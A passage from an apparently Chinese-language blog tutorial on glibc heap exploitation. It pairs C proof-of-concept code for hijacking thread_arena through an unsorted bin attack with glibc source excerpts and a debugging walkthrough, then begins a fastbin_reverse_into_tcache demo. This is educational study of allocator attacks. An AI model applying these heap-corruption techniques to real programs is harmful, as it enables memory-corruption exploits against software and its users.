class="comment">     * be our target for the unsorted bin attack.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and then manipulate the main_arena.system_mem field in order to pass the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size sanity checks for the chunk overlapping the main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this way we can abuse a heap pointer</span></span><br><span class="line"><span class="comment">     * as a valid sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM -&gt; narenas-0x10\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk      bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can now trigger the unsorted bin attack by requesting the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;INTM chunk as an exact fit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * request the INTM chunk from the unsorted bin</span></span><br><span class="line"><span class="comment">     * in order to trigger a partial unlinking between</span></span><br><span class="line"><span class="comment">     * head and narenas-0x10.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Perfect. narenas is now set to the address of the unsorted bin&#x27;s head\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which should be large enough to exceed the existing arena limit.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s proceed with the manipulation of the main_arena.next pointer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;within our previously allocated binmap-chunk. The address we write\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to this field will become the future value of thread_arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set main_arena.next to an arbitrary address. The</span></span><br><span class="line"><span class="comment">     * next two calls to malloc will overwrite thread_arena</span></span><br><span class="line"><span class="comment">     * with the same address. I&#x27;ll reuse INTM as fake arena.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Note, that INTM is not suitable as fake arena but</span></span><br><span class="line"><span class="comment">     * nevertheless, it is an easy way to demonstrate that</span></span><br><span class="line"><span class="comment">     * we are able to set thread_arena to an arbitrary address.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done. Now all what&#x27;s left to do is to trigger two calls to the reused_arena()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function by making two requests for an invalid chunksize.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the first call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address of</span></span><br><span class="line"><span class="comment">     * the current main-arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the second call will force the reused_arena()</span></span><br><span class="line"><span class="comment">     * function to set thread_arena to the address stored</span></span><br><span class="line"><span class="comment">     * in main_arena.next - our fake arena.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We did it. We hijacked the thread_arena symbol and from now on memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;requests will be serviced by our fake arena. Let&#x27;s check this out\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;by allocating a fakechunk on the stack from one of the fastbins\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of our new fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * construct a 0x70-fakechunk on the stack...</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">uint64_t</span> fakechunk[<span class="number">4</span>] = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="number">0x0000000000000000</span>, <span class="number">0x0000000000000073</span>,</span><br><span class="line">        <span class="number">0x4141414141414141</span>, <span class="number">0x0000000000000000</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ...and place it in the 0x70-fastbin of our fake arena</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x20</span>)) = (<span class="type">uint64_t</span>) (fakechunk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fakechunk in position at stack address %p\n&quot;</span>, fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target data within the fakechunk at address %p\n&quot;</span>, &amp;fakechunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Its current value is %#lx\n\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And after requesting a 0x70-chunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * use the fake arena to perform arbitrary allocations</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...malloc returns us the fakechunk at %p\n\n&quot;</span>, FAKECHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overwriting the newly allocated chunk changes the target\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data as well: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * overwriting the target data</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAKECHUNK)) = <span class="number">0x4242424242424242</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx\n&quot;</span>, fakechunk[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * confirm success</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">assert</span>(fakechunk[<span class="number">2</span>] == <span class="number">0x4242424242424242</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>先了解一下 <code>binmap</code> 的用处。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_state</span></span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_state</span> *next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>binmap</code> 在 <code>malloc</code> 过程中的下面两个场景会被修改：</p>
<ol>
<li>在遍历 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 时如果将该 <code>chunk</code> 放入对应的 <code>small bin</code> 或 <code>large bin</code> 中会在 <code>binmap</code> 对应位置置位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mark_bin</span>(av, victim_index); </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>在遍历 <code>small bin + large bin</code> 找大小不小于当前 <code>chunk</code> 的空闲 <code>chunk</code> 时如果对应 <code>binmap</code> 置位的 <code>bin</code> 是空闲的就将对应位置复位。</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">av-&gt;binmap[block] = map &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-18"><a href="#调试-18" class="headerlink" title="调试"></a>调试</h3><p>首先申请依次申请 <code>SMALLCHUNK_0x90, FASTCHUNK_0x20, FASTCHUNK_0x40</code>，然后将 <code>SMALLCHUNK_0x90</code> 释放到 <code>unsorted bin</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027200937204.png"
                      alt="image-20231027200937204"
                ></p>
<p>然后申请 <code>SMALLCHUNK_0xa0(INTM)</code>，这时候会触发第一个改变 <code>binmap</code> 的条件，会将 <code>binmap[0]</code> 改为 <code>0x200</code>，我们将其作为<code>fake_chunk_size</code>，暂且叫包含 <code>binmap</code> 的 <code>fake_chunk</code> 叫 <code>BINMAP</code>。并将 <code>SMALLCHUNK_0x90</code> 放进 <code>small_bin_0x90</code> 的位置上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201346420.png"
                      alt="image-20231027201346420"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201322231.png"
                      alt="image-20231027201322231"
                ></p>
<p>然后重新申请 <code>SMALLCHUNK_0x90</code>，再将其释放到 <code>unsorted_bin</code> 中。利用 <code>UAF</code> 漏洞将其 <code>SMALLCHUNK_0x90.bk-&gt;&amp;main_arena.bins[253]</code>，也就是 <code>fake_chunk_prevsize</code>。 再将 <code>FASTCHUNK_0x40.bk-&gt;(SMALLCHUNK_0xa0)INTM</code>，然后释放 <code>FASTBIN_0x20, FASTBIN_0x40</code>。其中 <code>FASTBIN_0x20</code> 正好位于 <code>main_arena_size</code>  的位置，其作用是确保 <code>main_arena</code> 所在的 <code>fake chunk</code> 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 此时 <code>unsorted bin</code> 结构如下。</p>
<p><em>(因为 <code>binmap</code> 数组是 <code>uint</code> 类型是 <code>4</code> 字节大小，所以 <code>fake_chunk_binmap.bk == next</code> ，<code>next</code> 指针指向 <code>&amp;main_arena</code>)</em></p>
<p><code>head.bk -&gt; SMALLCHUNK_0x90.bk -&gt; BINMAP.bk -&gt; main-arena.bk -&gt; FASTCHUNK_0x40.bk -&gt; INTM</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027202331065.png"
                      alt="image-20231027202331065"
                ></p>
<p>此时申请 <code>0x1f8</code> 大小的 <code>chunk</code> 将会把正好合适的 <code>BINMAP</code> 申请出来。之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 <code>0</code> ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 <code>NULL</code> 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">arena_get</span>(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = <span class="built_in">arena_get_retry</span>(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LIBC_PROBE</span>(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) <span class="built_in">mutex_unlock</span>(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = <span class="built_in">arena_get2</span>(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get2</code> 函数中，如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> mstate internal_function <span class="title">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">get_free_list</span>(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = <span class="built_in">NARENAS_FROM_NCORES</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">catomic_compare_and_exchange_bool_acq</span>(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="built_in">catomic_decrement</span>(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = <span class="built_in">reused_arena</span>(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> narenas = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> mstate</span></span><br><span class="line"><span class="function"><span class="title">reused_arena</span><span class="params">(mstate avoid_arena)</span> </span>&#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">arena_is_corrupt</span>(result) &amp;&amp; !<span class="built_in">mutex_trylock</span>(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后两次调用 <code>malloc(0xffffffffffffffbf + 1)</code>，（第一次调用<code>result==&amp;main_arena;next_to_use==INTM</code>）; 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 <code>NULL</code>，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 <code>unsorted bin attack</code> 将 <code>narenas</code> 改成一个较大的数。为了确保从 <code>unsorted bin</code> 中取出的 <code>chunk</code> 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为<code> 0xffffffffffffffff</code> 。将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 <code>unsorted bin attack </code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205809961.png"
                      alt="image-20231027205809961"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210017826.png"
                      alt="image-20231027210017826"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205922973.png"
                      alt="image-20231027205922973"
                ></p>
<p>申请 <code>0xa0</code> 大小的 <code>chunk</code> （申请被构造在 <code>unsorted bin</code> 的 <code>INTM</code>）触发 <code>unsorted bin attack</code>。此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210544449.png"
                      alt="image-20231027210544449"
                ></p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将 <code>thread_arena</code> 指向我们伪造的 <code>INTM</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210759803.png"
                      alt="image-20231027210759803"
                ></p>
<p>伪造如下 <code>fast_chunk</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211024351.png"
                      alt="image-20231027211024351"
                ></p>
<p>之后将 <code>(uint64_t) (INTM_prev+0x30)</code> 指向伪造的 <code>chunk</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211133139.png"
                      alt="image-20231027211133139"
                ></p>
<p>此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211207749.png"
                      alt="image-20231027211207749"
                ></p>
<h1 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h1><p>第五部分开始使用 <code>ubuntu:18.04</code> 编译。<code>Tcache</code> 基础请看 <a class="link"   href="https://bbs.kanxue.com/thread-278105.htm" >Tcache安全机制及赛题详细解析(gundam &amp;&amp; House of Atum) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-19"><a href="#源码-19" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span 